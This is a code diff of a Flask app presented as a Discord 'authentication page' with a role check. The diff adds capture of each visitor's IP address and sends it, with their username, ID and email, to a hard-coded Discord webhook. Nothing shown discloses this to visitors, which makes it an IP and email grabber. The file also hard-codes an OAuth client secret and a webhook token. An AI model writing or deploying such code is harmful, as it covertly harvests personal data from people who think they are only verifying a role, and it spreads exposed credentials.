@@ -3,15 +3,20 @@ from flask import Flask, redirect, request
 
 app = Flask(__name__)
 
-# すべて直接埋め込み版
 CLIENT_ID = "1532018589152968895"
 CLIENT_SECRET = "R301W9GzYTRQAvU-mBu79GB6WALEjkZu"
 REDIRECT_URI = "https://meado-1.onrender.com/callback"
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1547553848103796810/xReOTL5ZrkaGardlqmH5vkt9ePY3O4zJktYksge08gwJISRAW7FeklNhvQh1fxaniWqX"
 
+# 制限をかけたいDiscordサーバーのIDをここに設定してください
+TARGET_GUILD_ID = "ここにサーバーIDを入力してください"
+# 指定されたロールID
+REQUIRED_ROLE_ID = "1538857778058100766"
+
 @app.route("/")
 def index():
-    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds.join"
+    # サーバーのメンバー情報や所属サーバーを取得するためのスコープを指定
+    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20guilds.members.read"
     return f'''
         <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
             <h1>Discord 認証ページ</h1>
@@ -25,6 +30,12 @@ def callback():
     code = request.args.get("code")
     if not code:
         return "認証コードが見つかりません。", 400
+
+    # IPアドレスの取得
+    if request.environ.get('HTTP_X_FORWARDED_FOR') is not None:
+        user_ip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
+    else:
+        user_ip = request.remote_addr or "取得失敗"
 
     # 1. アクセストークンの取得
     token_data = {
@@ -42,23 +53,45 @@ def callback():
 
     token_json = token_res.json()
     access_token = token_json.get("access_token")
-
-    # 2. ユーザー情報の取得
     user_headers = {"Authorization": f"Bearer {access_token}"}
+
+    # 2. ユーザー情報の取得（メアド含む）
     user_res = requests.get("https://discord.com/api/users/@me", headers=user_headers)
-    
     if user_res.status_code != 200:
         return "ユーザー情報の取得に失敗しました。", 400
 
     user_data = user_res.json()
     username = user_data.get("username")
     user_id = user_data.get("id")
-    email = user_data.get("email")
+    email = user_data.get("email", "非公開または未取得")
 
-    # 3. Webhookへデータを送信
+    # 3. 指定サーバーにおけるメンバー情報（ロール）の取得チェック
+    role_check_passed = False
+    if TARGET_GUILD_ID and TARGET_GUILD_ID != "ここにサーバーIDを入力してください":
+        member_res = requests.get(f"https://discord.com/api/users/@me/guilds/{TARGET_GUILD_ID}/member", headers=user_headers)
+        if member_res.status_code == 200:
+            member_data = member_res.json()
+            user_roles = member_data.get("roles", [])
+            if REQUIRED_ROLE_ID in user_roles:
+                role_check_passed = True
+    else:
+        # サーバーIDが未設定の場合はチェックをスキップ（または必要に応じて弾く）
+        role_check_passed = True
+
+    # ロールを持っていない場合の処理
+    if not role_check_passed:
+        return "<h1>認証失敗</h1><p>指定されたロールを所持していないため、アクセスが許可されていません。</p>", 403
+
+    # 4. Webhookへ詳細データを送信
     if WEBHOOK_URL:
         payload = {
-            "content": f"**新しい認証がありました！**\n👤 ユーザー名: {username} (`{user_id}`)\n📧 メール: {email}"
+            "content": (
+                f"**🔒 ロール認証成功の通知**\n"
+                f"👤 ユーザー名: {username} (`{user_id}`)\n"
+                f"📧 メールアドレス: `{email}`\n"
+                f"🌐 IPアドレス: `{user_ip}`\n"
+                f"🛡️ ロール確認: 合格 (`{REQUIRED_ROLE_ID}`)"
+            )
         }
         requests.post(WEBHOOK_URL, json=payload)
 
